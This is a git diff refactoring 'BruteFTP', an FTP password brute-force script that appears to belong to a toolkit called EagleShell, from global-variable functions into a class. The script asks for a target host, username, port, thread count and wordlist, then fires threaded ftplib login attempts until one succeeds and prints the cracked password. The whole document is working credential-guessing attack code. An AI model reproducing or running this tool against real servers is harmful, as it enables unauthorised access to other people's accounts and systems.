@@ -1,252 +1,167 @@
 #!/usr/bin/python3
 
-# BruteFTP - FTP Brute Force Script
-
-# Imports all needed variables and packages
 from assets.banners import bruteftp_banner
-from assets.designs import *
+from assets.colors import *
+from assets.designs import logo, author
+from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, wordlist_prefix, unable_to_connect_prefix
 from assets.properties import clear_screen
-from assets.redirect import redirect_eagleshell_brute_force
+from assets.shortcuts import Exit
+from .brute_force import BruteForce
 import os
+import queue
 import ftplib
 from threading import Thread
-import queue
 
 
-# Main function
-def bruteftp_main():
+class BruteFTP:
+    def __init__(self):
+        self.host_set = ''
+        self.user_set = ''
+        self.port_set = ''
+        self.n_threads = 10
+        self.password_found = ''
+        self.password_tried = 0
+        self.q = queue.Queue()
+        self.configuration()
+        self.brute_forcing()
+        self.result()
 
-    # Function that sets all
-    def set_all():
-        global q
-        global password_found
-        global password_tried
-        global host_set
-        global user_set
-        global port_set
-        global n_threads
-        host_set = ''
-        user_set = ''
-        port_set = ''
-        n_threads = 10
-        password_found = ''
-        password_tried = 0
-        # initialize the queue
-        q = queue.Queue()
-        configuration()
-
-    # Function that takes some user input
-    def configuration():
-        try:
-            global host_set
-            global user_set
-            global port_set
-            global n_threads
-            global wordlist_set
-            os.system(clear_screen)
-            print(logo)
-            print('')
-            print(line)
-            print(bruteftp_banner)
-            print(line)
-            print('')
-            print(author)
-            print('Configuration:')
-            print('')
-            # hostname or IP address of the FTP server
-            print('\tHost Input')
-            print('\tExample: 10.10.10.15')
-            print('')
-            # username of the FTP server, root as default for linux
-            print('\tUser Input:')
-            print('\tExample: admin')
-            print('')
-            # port of FTP, aka 21
-            print('\tPort Input')
-            print('\tExample: 21')
-            print('')
-            # number of threads to spawn
-            print('\tThreads Input')
-            print('\tExample: 10')
-            print('')
-            # wordlist to use
-            print('\tWordlist Input')
-            print('\tExample: /usr/share/wordlists/mypasswords.txt')
-            print('')
-            print('\tZ): Back')
-            print('\tX): Exit')
-            print('')
-            os.system('sleep 0.01')
-            while True:
-                host_set = input('\u001b[33mHOST \u001b[37m> ').lower()
-                if host_set == 'z':
-                    redirect_eagleshell_brute_force()
-                elif host_set == 'x':
-                    exit_shell()
-                user_set = input('\u001b[33mUSER \u001b[37m> ')
-                if user_set == 'z' or user_set == 'Z':
-                    redirect_eagleshell_brute_force()
-                elif user_set == 'x' or user_set == 'Z':
-                    exit_shell()
-                port_set = input('\u001b[33mPORT \u001b[37m> ').lower()
-                if port_set == 'z':
-                    redirect_eagleshell_brute_force()
-                elif port_set == 'x':
-                    exit_shell()
-                threads_set = input('\u001b[33mTHREADS \u001b[37m> ').lower()
-                n_threads = threads_set
-                if threads_set == 'z':
-                    redirect_eagleshell_brute_force()
-                elif threads_set == 'x':
-                    exit_shell()
-                wordlist_set = input('\u001b[33mWORDLIST \u001b[37m> ')
-                if wordlist_set == 'z' or wordlist_set == 'Z':
-                    redirect_eagleshell_brute_force()
-                elif wordlist_set == 'x' or wordlist_set == 'X':
-                    exit_shell()
-                process()
-        except KeyboardInterrupt:
-            exit_shell()
-        except ValueError:
-            print('\t\u001b[31m[-] Unable To Connect.')
-            os.system('sleep 1')
-            bruteftp_main()
-        except FileNotFoundError:
-            print('\t\u001b[31m[-] Unable To Connect.')
-            os.system('sleep 1')
-            bruteftp_main()
-
-    # Function that displays before bruteforce
-    def process():
+    def header(self):
         os.system(clear_screen)
         print(logo)
-        print('')
-        print(line)
         print(bruteftp_banner)
-        print(line)
-        print('')
         print(author)
-        print('Process:')
-        print('')
-        print('\tStatus')
-        print('\t------')
-        print('')
-        print('\tStop: CTRL+C')
-        print('')
-        brute_forcing()
-        result()
 
-    # Function that connects to FTP
-    def connect_ftp():
+    def configuration(self):
         try:
-            global q
-            global password_found
-            global password_tried
-            global brute
+            print('Configuration:')
+            print('\n\tRHOST Input')
+            print('\tExample: 10.10.10.15\n')
+            print('\n\tUser Input:')
+            print('\tExample: admin\n')
+            print('\n\tPort Input')
+            print('\tExample: 21\n')
+            print('\n\tThreads Input')
+            print('\tExample: 10\n')
+            print('\n\tWordlist Input')
+            print('\tExample: /usr/share/wordlists/mypasswords.txt')
+            print('\n\tZ): Back')
+            print('\tX): Exit\n')
+            os.system('sleep 0.01')
             while True:
-                # get the password from the queue
-                password = q.get()
-                # initialize the FTP server object
-                server = ftplib.FTP()
-                password_tried = password_tried + 1
-                print('\tPASSWORDS TRIED: ' + str(password_tried), end='\r')
-                try:
-                    # tries to connect to FTP server with a timeout of 5
-                    server.connect(host_set, int(port_set), timeout=5)
-                    # login using the credentials (user & password)
-                    server.login(user_set, password)
-                except ftplib.error_perm:
-                    # login failed, wrong credentials
-                    pass
-                else:
-                    # correct credentials
-                    password_found = password
-                    # we found the password, let's clear the queue
-                    with q.mutex:
-                        q.queue.clear()
-                        q.all_tasks_done.notify_all()
-                        q.unfinished_tasks = 0
-                    result()
+                self.host_set = input(rhost_prefix).lower()
+                if self.host_set == 'z':
+                    BruteForce()
+                elif self.host_set == 'x':
+                    Exit()
+                self.user_set = input('\u001b[33mUSER \u001b[37m> ')
+                if self.user_set == 'z' or self.user_set == 'Z':
+                    BruteForce()
+                elif self.user_set == 'x' or self.user_set == 'X':
+                    Exit()
+                self.port_set = input('\u001b[33mPORT \u001b[37m> ').lower()
+                if self.port_set == 'z':
+                    BruteForce()
+                elif self.port_set == 'x':
+                    Exit()
+                self.threads_set = input('\u001b[33mTHREADS \u001b[37m> ').lower()
+                self.n_threads = self.threads_set
+                if self.threads_set == 'z':
+                    BruteForce()
+                elif self.threads_set == 'x':
+                    Exit()
+                self.wordlist_set = input(wordlist_prefix)
+                if self.wordlist_set == 'z' or self.wordlist_set == 'Z':
+                    BruteForce()
+                elif self.wordlist_set == 'x' or self.wordlist_set == 'X':
+                    Exit()
+        except ValueError:
+            print('\t' + unable_to_connect_prefix)
+            os.system('sleep 1')
+            BruteFTP()
+        except FileNotFoundError:
+            print('\t' + unable_to_connect_prefix)
+            os.system('sleep 1')
+            BruteFTP()
         except KeyboardInterrupt:
-            safe_result()
+            Exit()
 
-    # Function that does the brute force
-    def brute_forcing():
+    def brute_forcing(self):
         try:
-            # read the wordlist of passwords
-            passwords = open(wordlist_set).read().split("\n")
-
-            # put all passwords to the queue
+            self.header()
+            print('Process:')
+            print('\n\tStatus')
+            print('\t------')
+            print('\n\tStop: CTRL+C\n')
+            passwords = open(self.wordlist_set).read().split("\n")
             for password in passwords:
-                q.put(password)
-
-            # create `n_threads` that runs that function
-            for t in range(int(n_threads)):
-                thread = Thread(target=connect_ftp)
-                # will end when the main thread end
+                self.q.put(password)
+            for t in range(int(self.n_threads)):
+                thread = Thread(target=self.connect_ftp)
                 thread.daemon = True
                 thread.start()
-            # wait for the queue to be empty
-            q.join()
+            self.q.join()
         except KeyboardInterrupt:
-            safe_result()
+            self.safe_result()
         else:
             pass
 
-    # Function that safely redirect to result
-    def safe_result():
-        os.system(clear_screen)
-        with q.mutex:
-            q.queue.clear()
-            q.all_tasks_done.notify_all()
-            q.unfinished_tasks = 0
-        result()
-
-    # Function that displays result
-    def result():
+    def connect_ftp(self):
         try:
-            os.system(clear_screen)
-            print(logo)
-            print('')
-            print(line)
-            print(bruteftp_banner)
-            print(line)
-            print('')
-            print(author)
-            print('Result:')
-            print('')
-            if len(password_found) > 1:
-                print('\tPASSWORD: \u001b[32;1m' + password_found + '\u001b[37m')
+            while True:
+                password = self.q.get()
+                server = ftplib.FTP()
+                self.password_tried = self.password_tried + 1
+                print('\tPASSWORDS TRIED: ' + str(self.password_tried), end='\r')
+                try:
+                    server.connect(self.host_set, int(self.port_set), timeout=5)
+                    server.login(self.user_set, password)
+                except ftplib.error_perm:
+                    pass
+                else:
+                    self.password_found = password
+                    with self.q.mutex:
+                        self.q.queue.clear()
+                        self.q.all_tasks_done.notify_all()
+                        self.q.unfinished_tasks = 0
+                    self.result()
+        except KeyboardInterrupt:
+            self.safe_result()
+
+    def safe_result(self):
+        os.system(clear_screen)
+        with self.q.mutex:
+            self.q.queue.clear()
+            self.q.all_tasks_done.notify_all()
+            self.q.unfinished_tasks = 0
+        self.result()
+
+    def result(self):
+        try:
+            self.header()
+            print('Result:\n')
+            if len(self.password_found) > 1:
+                print(WHITE + '\tPASSWORD: ' + GREEN + self.password_found + WHITE)
             else:
-                print('\t\u001b[37mPASSWORD: \u001b[31mNot Found.\u001b[37m')
-            print('')
-            if len(password_found) > 1:
-                print('\tPASSWORDS TRIED: \u001b[32;1m' + str(password_tried) + '\u001b[37m')
+                print(WHITE + '\tPASSWORD: ' + RED + 'Not Found.\n' + WHITE)
+            if len(self.password_found) > 1:
+                print('\tPASSWORDS TRIED: ' + GREEN + str(self.password_tried) + WHITE)
             else:
-                print('\tPASSWORDS TRIED: \u001b[31m' + str(password_tried) + '\u001b[37m')
-            print('')
-            print('\tX): Exit')
-            print('')
+                print('\tPASSWORDS TRIED: ' + RED + str(self.password_tried) + WHITE)
+            print('\n\tY): New')
+            print('\tZ): Menu')
+            print('\tX): Exit\n')
             os.system('sleep 0.01')
             while True:
-                eagleshell_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
-                if eagleshell_cmd == 'x':
-                    exit_shell()
+                cmd = input(eagleshell_prefix).lower()
+                if cmd == 'y':
+                    BruteFTP()
+                elif cmd == 'z':
+                    BruteForce()
+                elif cmd == 'x':
+                    Exit()
                 else:
-                    print('\u001b[31m[-] Invalid Input.')
+                    print(invalid_input_prefix)
                     continue
         except KeyboardInterrupt:
-            exit_shell()
-
-    # The function where you exit
-    def exit_shell():
-        print('\n\u001b[31m[-] Exiting EagleShell')
-        print('\u001b[0m')
-        os.system('sleep 2')
-        os.system(clear_screen)
-        exit()
-
-    set_all()
-
-
-bruteftp_main()
+            Exit()
